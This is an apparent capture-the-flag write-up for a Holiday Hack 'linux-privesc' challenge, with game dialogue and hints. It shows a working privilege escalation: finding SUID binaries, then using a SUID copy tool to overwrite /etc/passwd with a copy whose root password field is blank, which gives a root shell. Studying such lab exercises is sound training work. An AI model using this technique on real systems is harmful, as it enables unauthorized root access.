# linux-privesc <img src="../img/tree-red.png" alt="drawing" width="20"/><img src="../img/tree-red.png" alt="drawing" width="20"/><img src="../img/tree-red.png" alt="drawing" width="20"/><img src="../img/tree-outline.png" alt="drawing" width="20"/><img src="../img/tree-outline.png" alt="drawing" width="20"/>

## Objective
Rose mold is in Ostrich Saloon on the Island of Misfit Toys. Give her a hand with escalation for a tip about hidden islands.

## Conversations

Rose Mold

Initial conversation:

- What am I doing in this saloon? The better question is: what planet are you from?
- Yes, I’m a troll from the Planet Frost. I decided to stay on Earth after Holiday Hack 2021 and live among the elves because I made such dear friends here.
- Whatever. Do you know much about privilege escalation techniques on Linux?
- You're asking why? How about I'll tell you why after you help me.
- And you might have to use that big brain of yours to get creative, bub.

After solving challengs:

- Yup, I knew you knew. You just have that vibe.
- To answer your question of why from earlier... Nunya!
- But, I will tell you something better, about some information I... found.
- There's a hidden, uncharted area somewhere along the coast of this island, and there may be more around the other islands.
- The area is supposed to have something on it that's totes worth, but I hear all the bad vibe toys chill there.
- That's all I got. K byyeeeee.
- Ugh... n00bs...

## Hints

- Use the privileged binary to overwriting a file to escalate privileges could be a solution, but there's an easier method if you pass it a crafty argument.
- There's [various ways](https://payatu.com/blog/a-guide-to-linux-privilege-escalation/) to escalate privileges on a Linux system.

## Useful AI Prompts

## Approach
For this approach, I first went through the normal Linux survey commands upon connection. Nothing really stood out, so I began looking for exploits related to the Linux distro which is Linux 3a7ac2253603 5.10.0-26-cloud-amd64.
Looking for exploits, there were some viable ones, but they would have taken some work. I spent some time reviewing [this](https://payatu.com/blog/a-guide-to-linux-privilege-escalation/). I then pivoted to looking for a way to exploit SUID executables,
and found the following:

```console
elf@408ce566d9d0:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/simplecopy
```

At first, I went down some rabbit holes trying to think of a way to exploit one of those executables, so I went on to other challenges. I then had an epiphany - what if I grabbed the /etc/passwd file, copied it, modified the copied version so root doesn't use /etc/shadow/ and then used simplecopy to copy it back to /etc/passwd? (SMH) 

Exploit:
```console
In a digital winter wonderland we play,
Where elves and bytes in harmony lay.
This festive terminal is clear and bright,
Escalate privileges, and bring forth the light.

Start in the land of bash, where you reside,
But to win this game, to root you must glide.
Climb the ladder, permissions to seize,
Unravel the mystery, with elegance and ease.

There lies a gift, in the root's domain,
An executable file to run, the prize you'll obtain.
The game is won, the challenge complete,
Merry Christmas to all, and to all, a root feat!

* Find a method to escalate privileges inside this terminal and then run the binary in /root *

elf@ff34bc1d8894:~$ pwd
/home/elf
elf@ff34bc1d8894:~$ ls
HELP
elf@ff34bc1d8894:~$ cp /etc/passwd passwdcopy
elf@ff34bc1d8894:~$ sed -i 's;root:x:0:0:root:/root:/bin/bash;root::0:0:root:/root:/bin/bash;g' passwdcopy
elf@ff34bc1d8894:~$ /usr/bin/simplecopy passwdcopy /etc/passwd
elf@ff34bc1d8894:~$ su
root@ff34bc1d8894:/home/elf# cd /root
root@ff34bc1d8894:~# ls
runmetoanswer
root@ff34bc1d8894:~# ./runmetoanswer 
Who delivers Christmas presents?

> 
```

When you execute runmetoanswer, your answer is case sensitive :)

## Alternate approach
